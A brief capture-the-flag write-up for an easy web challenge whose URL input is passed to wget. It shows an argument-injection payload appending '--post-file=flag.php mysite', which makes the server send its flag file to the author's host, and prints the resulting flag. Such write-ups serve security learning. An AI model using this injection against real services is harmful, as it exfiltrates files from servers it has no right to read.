# downloader-v1 (50pts, 123 solved) Web [Easy]

## First look
When we open the website, we can enter an URL to download, when we follow the example (`http://example.com/image.jpg`), we get some shell output:

```
...
$ wget https://example.com/image.jpeg 2>&1
...
```

## Solving
From the page source, we can see that we need to get the contents of `flag.php`. I just simply added to the original query `--post-file=flag.php mysite`.  
So it becomes:
```
http://example.com/image.jpg --post-file=flag.php mysite
```
And after a second, we get our flag: `DCTF{6789af26f90396678909a99bf46ba3a78b2f1b349fbc4385e6c50556c1d0c9ff}`